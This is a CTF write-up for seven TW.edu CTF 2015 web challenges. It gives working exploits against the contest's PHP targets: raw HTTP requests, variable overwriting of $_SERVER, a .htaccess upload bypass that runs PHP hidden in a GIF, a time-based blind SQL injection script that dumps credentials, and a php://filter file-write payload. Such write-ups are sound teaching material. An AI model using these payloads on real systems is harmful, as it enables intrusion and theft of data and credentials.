
TW.edu CTF 2015 Write up by Mai-Hsuan Chia (@j84255801912)
===============

----------------------------------

## TW.edu CTF 2015: Mission-1

---------------------------------------
**Category:** web **Points:** 50 **Solves:**  **Description:**

> Snoopy give you some missions.
> If you can finish them, he will give you flags.

**mission1.php**
```html
'flag' is a kind of encoding. You should accept that encoding that the web server could give you the flag.
```

### Solution
Directly send a http request using GET method with the header including `Accept-Encoding: flag` and then the server gives me the flag.
I first used the chrome extension `Postman` to send the request, but failed to get the flag. After observing the request made by chrome, I found that the browser automatically added the `Accept-Encoding: *` and overwrited our header.

Finally, I wrote a raw request

**http_request.txt**
```
GET /mission1.php HTTP/1.1
Host: mission.cebrusfs.com
Accept-Encoding: flag
            # This empty line is needed

```
and used
```bash
$ cat http_request.txt | nc mission.cebrusfs.com 80
```
then got the flag
```html
HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 06:24:27 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Content-Length: 67
Content-Type: text/html

You accepted the flag.<br>Here you are: CTF{custom_http_header!!!!}
```

## TW.edu CTF 2015: Mission-2

---------------------------------------
**Category:** web **Points:** 75 **Solves:**  **Description:**

> Snoopy give you some missions.
> If you can finish them, he will give you flags.

**mission2.php**
```html
Not Implemented
GET to /mission2.php not supported.
```
### Solution
I found that this php only accept OPTIONS method.
Therefore, I wrote a raw HTTP request do OPTIONS request.

**http_request.txt**
```
OPTIONS /mission2.php HTTP/1.1
Host: mission.cebrusfs.com

```
then get
```bash
$ cat http_request.txt | nc mission.cebrusfs.com 80

HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 06:36:10 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Allow: GETFLAG,OPTIONS
Content-Length: 0
Content-Type: text/html

```

From the response we know the site allows GETFLAG, OPTIONS method only.
So contructed a GETFLAG request

**http_request.txt**
```
GETFLAG /mission2.php HTTP/1.1
Host: mission.cebrusfs.com

```
then got the flag
```
$ cat http_request.txt | nc mission.cebrusfs.com

HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 06:56:52 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Content-Length: 58
Content-Type: text/html

CTF{502_not_implement????sent_custom_http_method_instead~}
```

## TW.edu CTF 2015: Mission-3

---------------------------------------
**Category:** web **Points:** 100 **Solves:**  **Description:**

> Snoopy give you some missions.
> If you can finish them, he will give you flags.

**mission3.php**
```php
 <?php
show_source(__FILE__);

$lv1 = 0; $lv2 = 0; $lv3 = 0;

$a = @$_GET['arg1'];
if (!is_array($a))
{
    $lv1 = 1;
    for ($i = 0; $i < 256; $i++)
        $lv1 &= ord($a[$i]) == $i;
}

$a = @$_GET['arg2'];
if (is_array($a))
{
    $lv2 |= @$a[1] === $a[2];
    $lv3 |= @(!is_numeric($a[0]) && $a[0] >= 217);
}


echo "lv1: $lv1<br>";
echo "lv2: $lv2<br>";
echo "lv3: $lv3<br>";

if ($lv1 && $lv2 && $lv3){
    include "flag.php";
    echo $flag_3;
}
lv1: 0
lv2: 0
lv3: 0
```
### Solution
It is trivial that `$_GET[arg1]` must be a 256-byte string as `"\x00\x01...\x255"`, and `$_GET[arg2]` must be an array as `[?, x, x]`. Furthermore, the `?` is not numeric and >= 217. `"1234p"` is obviously not numeric, but due to the looseness of PHP, `"1234p" >= 217`.

Therefore we can construct a payload satisfying these conditions.

**exploit.py**
```python
import requests

arg1 = ''.join([chr(i) for i in xrange(256)])
arg2 = ['1234p', 0, 0]
payload = {
            'arg1'  :   arg1,
            'arg2[]'  :   arg2, # this [] is very important!
            }

r = requests.get("http://mission.cebrusfs.com/mission3.php", params=payload)
print r.text
```
and we get the flag
```html
... # ignored

</code>lv1: 1<br>lv2: 1<br>lv3: 1<br>CTF{you_already_know_how_to_send_GET_and_POST_requests}
```

## TW.edu CTF 2015: Overthewire

---------------------------------------
**Category:** web **Points:** 100 **Solves:**  **Description:**

> http://overthewire.hackme.cc/

**overthewire.hackme.cc**
```html
Index of /
[ICO]   Name    Last modified   Size    Description
[ ] flag.php    2016-01-03 08:30    71
[ ] overthewire.php 2016-01-03 08:31    275
[TXT]   overthewire.txt 2016-01-03 08:31    275
Apache/2.4.7 (Ubuntu) Server at overthewire.hackme.cc Port 80
```

**overthewire.txt**
```php
 <?php
    include 'flag.php';

    // preparing
    foreach ($_REQUEST as $key => $value) {
        $$key = $value;
    }

    if ( $_SERVER['REMOTE_ADDR'] == '127.0.0.1' ){
        echo $flag;
    } else {
        echo 'there is no space like 127.0.0.1';
    }
```

### Solution
On the first sight of this problem, I thought we had to modify the http header to deceive the web server. However, `$_SERVER['REMOTE_ADDR']` is impossible to be '127.0.0.1' except that the request is from localhost. It can be faked at most as the proxy's IP.
So we need to find another way out. If we can create a http request with parameter `_SERVER[REMOTE_ADDR]=127.0.0.1`, in the `foreach` loop, `$$key = $value`, which will be parsed as `$(_SERVER[REMOTE_ADDR])=127.0.0.1`, we can overwrite the `$_SERVER[REMOTE_ADDR]` and get the flag.


**http_request.txt**
```
GET /overthewire.php?_SERVER[REMOTE_ADDR]=127.0.0.1 HTTP/1.1
Host: overthewire.hackme.cc

```

Captured The Flag!

```bash
$ cat http_request.txt | nc overthewire.hackme.cc 80

HTTP/1.1 200 OK
Date: Mon, 11 Jan 2016 11:29:03 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html

2f
CTF{the_world_is_not_beautiful_therefore_it_is}
0

```


## TW.edu CTF 2015: ShellMe

---------------------------------------
**Category:** web **Points:** 200 **Solves:**  **Description:**

> http://shellme.hackme.cc/

**shellme.hackme.cc**
```html
Index of /
[ICO]   Name    Last modified   Size    Description
[ ] flag.php    2016-01-03 08:37    37
[DIR]   sandbox/    2016-01-05 11:23    -
[ ] shellme.php 2016-01-02 08:57    906
Apache/2.4.7 (Ubuntu) Server at shellme.hackme.cc Port 80
```
**shellme.php**
```php
<!DOCTYPE html>
<html>
<body>

<form method="post" enctype="multipart/form-data">
    Upload your shell:
    <input type="file" name="file">
    <input type="submit" value="upload" name="submit">
</form>
</body>
</html>
```
### Solution
The upload page prohibits files with it's filename containing the word "php", but allows `.htaccess` and `*.gif`. I uploaded an `a.gif` which contained php code. However, the server was not to execute an image file. We needed to change it's rule using `.htaccess`.

**a.gif**
```php
<?php
$file = fopen("../../flag.php", "r");
while (!feof($file)) {
    $value = fgets($file);
    print "The value of this line is " . $value . "<br>";
}
fclose($file);
?>
```
**.htaccess** : tells the webserver to execute files whose name contains `a.gif` as php under this directory
```
<FilesMatch "a.gif">
SetHandler application/x-httpd-php
</FilesMatch>
```
Opened the url of `a.gif` and we get the flag

**shellme.hackme.cc/sandbox/650564fc50c8c5924c65a9cc36f00b33/a.gif**
```html
The value of this line is The value of this line is // CTF{a_bu_jiu_hao_bang_bang}
```


## TW.edu CTF 2015: SQLAB

---------------------------------------
**Category:** web **Points:** 200 **Solves:**  **Description:**

> http://sqlab.hackme.cc/

**sqlab.hackme.cc**
```html
Index of /
[ICO]   Name    Last modified   Size    Description
[ ] config.php  2016-01-03 08:34    380
[ ] sqlab.php   2016-01-01 13:32    1.6K
[TXT]   sqlab.txt   2016-01-01 13:32    1.6K
Apache/2.4.7 (Ubuntu) Server at sqlab.hackme.cc Port 80
```

**sqlab.txt**
```php
<?php
    include "config.php";

    $conn = mysql_connect($host, $user, $pass);
    mysql_select_db($dbname);


    function escape($str){
        $str = str_replace("'", "", $str);
        return $str;
    }

    function getip(){
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    $username = $_POST['username'];
    $password = $_POST['password'];
    if ( isset($username, $password) ) {
        $username = escape($username);
        $password = escape($password);

        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username);
        $res = mysql_query($sql);
        $result = mysql_fetch_object($res);

        $real_pass = $result->password;
        if ( $password && $real_pass === $password) {
            echo 'Congratulations, there is your flag: ' . $flag;
        } else {
            $ip = escape( getip() );
            $ua = escape( $_SERVER['HTTP_USER_AGENT'] );
            $sql = sprintf("INSERT INTO logs VALUES('%s', '%s')", $ip, $ua);
            mysql_query($sql) or die( mysql_error() );
            echo 'login failed, logged';
        }

    } else {

?>
<form method='POST'>
    username: <input type='text' name='username'> <br>
    password: <input type='password' name='password'> <br>
    <input type='submit'>
</form>

<?php } ?>
```

### Solution
Although the code uses `escape()` to remove parameters' single quotes, there are characters to incur SQL error.  If `$username`, `$ip`, `$ua` have trailing backslash '\\', single quotes in SQL after backslashs will be escaped.

For example, if `$username = "\\"` , the first `$sql` will be
```sql
SELECT * FROM users WHERE username='\'
```
The last `\'` will be thought as the single quote in the string `$username`. This SQL is not ended, so the `$res = mysql_query($sql);` induces error. Therefore, the first `$sql` is free from injection. We must work on the second one.

Let's set `$ip = "a\\"`, `$user = " , 1) #\\"`, the second `$sql` will be
```sql
INSERT INTO logs VALUES('a\', ' , 1) #\')
```
Remove the annotated code ...
```sql
INSERT INTO logs VALUES('a\', ' , 1)
```
This means we are inserting the string `a', ` and integer `1` into the database.
<br>
**My ideas about how to do injection**

<del>Do injections via the `SELECT ... ` query </del> : Failed because we can only escape one single quote, the query are invalid to be executed.

<del>Insert our own `username` and `password` into `users` table</del> : Failed because MySQL doesn't support inserting into 2 tables in one query.

Use `time based blind sql injection` : I want to guess the content of the `users` table. It can be done by blind sql injection. However, there is no sign for me about whether the result of a query is successful or not. This makes the usual blind sql injection fail. Therefore, I googled and found the time based one working!

**working on time based blind sql injection**

We need a SELECT to get the username and password in one query.
```sql
SELECT concat(username, 0x3a, password) FROM users LIMIT n, 1
```
It is blind sql injection, so we have to guess every character of every record, using the ascii value. The answer of the following condition, (the ascii value of the `i th` character of the `n th` record) > `j` , is either true or false.
```sql
ascii(substring((SELECT concat(username, 0x3a, password) FROM users LIMIT n, 1), i, 1)) > j
```
`SELECT CASE` is a if, then, else statement in MySQL.
```sql
SELECT CASE WHEN {condition} THEN {expression} ELSE {expression} END
```
It is used in time based sql injection. For example, in the following case, if the condition is true, then return the value of {expression}, else, sleep for 3 seconds.
```sql
SELECT CASE WHEN {condition} THEN {expression} ELSE sleep(3) END
```
Now we have a condition and `SELECT CASE`, let's combine them together.
```sql
SELECT CASE WHEN (ascii(substring((SELECT concat(username, 0x3a, password) FROM users LIMIT n, 1), i, 1)) > j) THEN 9898 ELSE sleep(3) END
```
Since we only have
```sql
INSERT INTO logs VALUES('\', ' , 1) #\')
```
Replace the `1` with our `SELECT CASE`
```sql
INSERT INTO logs VALUES('\', ' , SELECT CASE WHEN (ascii(substring((SELECT concat(username, 0x3a, password) FROM users LIMIT n, 1), i, 1)) > j) THEN 9898 ELSE sleep(3) END) #\')
```
To construct the above query, we need
```php
$ip = "\\"
$ua = ", SELECT CASE WHEN (ascii(substring((SELECT concat(username, 0x3a, password) FROM users LIMIT n, 1), i, 1)) > j) THEN 9898 ELSE sleep(3) END ) #\\"
```
Here is my code : **exploit.py**
```python
import requests
import hashlib
import time
import sys

url = "http://www.csie.ntu.edu.tw/~b99902063/sql.php"
payload = {
        'username'  : 'ken' ,
        'password'  : '123'
}

waiting_time = 3

table_names = []
table_index = 0
while True:
    char_index = 1
    string = ""
    while True:
        ascii_value = -1
        while True:
            code1 = " (SELECT CASE WHEN ascii(substring((SELECT concat(username, 0x3a, password) FROM users LIMIT {}, 1), {}, 1)) > {} THEN 3 ELSE sleep({}) END) ".format(table_index, char_index, ascii_value, waiting_time)
            code2 = ""
            headers = {
                        'Client-Ip'         :   '\\',
                        'User-Agent'        :   ', ' + code1 + ') ' + code2 +' #\\',
                    }
            t1 = time.time()
            r = requests.post(url, data=payload, headers=headers)
            if time.time() - t1 > waiting_time:
                break
            ascii_value += 1

        if ascii_value == 0:
            break
        string += chr(ascii_value)
        print chr(ascii_value)
        sys.stdout.flush()
        char_index += 1
    print string
    sys.stdout.flush()
    table_index += 1
    table_names.append(string)

print table_names
```

After I waited for about half hour, I got the "admin:whatsthefoxsay_hihihihihi_i_am_fox"

Using the username and password to login to the page, we got the flag.

**sqlab.hackme.cc/sqlab.php**
```html
Congratulations, there is your flag: CTF{el_psy_congroo!}
```

## TW.edu CTF 2015: Rilakkuma

---------------------------------------
**Category:** web **Points:** 300 **Solves:**  **Description:**

> http://rilakkuma.hackme.cc/

**rilakkuma.hackme.cc**
```html
Index of /
[ICO]   Name    Last modified   Size    Description
[ ] flag.php    2016-01-01 09:25    37
[IMG]   lala.png    2016-01-01 13:35    23K
[ ] rilakkuma.php   2016-01-06 14:15    858
[TXT]   rilakkuma.txt   2016-01-06 14:15    858
Apache/2.4.7 (Ubuntu) Server at rilakkuma.hackme.cc Port 80
```

**rilakkuma.txt**
```php
<?php
    $hash = md5( $_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']  );

    $dir = 'sandbox/' . $hash;
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $data = $_POST['data'];
    $filename = $_POST['filename'];

    if ( !isset($data, $filename) ) {
        die('nothing to do :(');
    }

    if( stristr($filename, '..') != False ){
        die('what do you do?');
    }
    if( stristr($filename, 'file://') != False ){
        die('what do you do?');
    }
    if( substr($filename, 0, 1) == '/' ){
        die('what do you do?');
    }

    $log = <<<EOF
    <?php
        exit('what do you do?');
        // $data

EOF;

    file_put_contents($filename . '.php', $log);
    echo '<img src=http://dl.stickershop.line.naver.jp/products/0/0/10/616/android/stickers/5751.png>';
```

### Solution
The `$filename` must not contain ".." and "file://", and must not begin with "/". We have to manipulate `$data` and `$filename` to get the content of `flag.php`. But how to execute our .php to bypass
`exit('what do you do?');` ?
PHP wrappers `php://filter` can filter the stream contents with some operations. `string.strip_tags` removes php/html tags in the stream. If we can make good use of it, we have chance to get rid of the annoying `<?php exit(); ...?>`. And If we directly assign our code to `$data`, `string.strip_tags` will simultaneously remove all code. Therefore, we need to transform our code to another representation first to avoid being removed. Fortunately, there is a filter `convert.base64-decode` can decode base64 form.
So, we transform our exploiting code to base64, and set the `$filename` as `php://filter/write=string.strip_tags|convert.base64-decode/resource=a`.  This will strip the original code, and turn my code from base64 to plaintext. Finally, execute the `a.php` and get the flag.

**exploit.py**

```python
import requests
import hashlib
import base64

url = "http://rilakkuma.hackme.cc/rilakkuma.php"
remote_addr = '127.0.0.1' # my server's ip or proxy's ip
user_agent = "10"

m = hashlib.md5()
m.update(user_agent)
m.update(remote_addr)
my_md5 = m.hexdigest()
print my_md5

my_code = '<?php $file = fopen("../../flag.php", "r"); while (!feof($file)) { $value = fgets($file); print "The value of this line is " . $value . "<br>";} fclose($file); ?>'
my_code = base64.b64encode(my_code)

payload = {
            'data'      :   "\n?>\n" + my_code,
            # using wrapper
            'filename'  :   "php://filter/write=string.strip_tags|convert.base64-decode/resource=a",
            }

headers = {
            'User-Agent'    :   user_agent,
        }
r = requests.post(url, data=payload, headers=headers)
print r.text
```

Capture the flag
```bash
$ python exploit.py

The value of this line is The value of this line is // CTF{lalalalalalalalalaba}
The value of this line is
```

